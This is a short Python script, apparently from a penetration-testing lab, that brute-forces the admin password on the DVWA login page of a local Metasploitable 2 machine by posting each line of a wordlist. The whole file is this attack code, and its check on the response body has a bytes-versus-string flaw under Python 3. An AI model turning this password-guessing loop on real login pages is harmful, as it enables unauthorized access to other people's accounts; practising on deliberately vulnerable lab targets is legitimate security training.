# This program was used against metasploitable's 2 dvwa website

import requests

target_url = "http://127.0.0.1/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}
#In our current website Login button name = Login, type=submit


with open("wordlist.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url,data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password: " + word)

print("[-]End of line reached.")
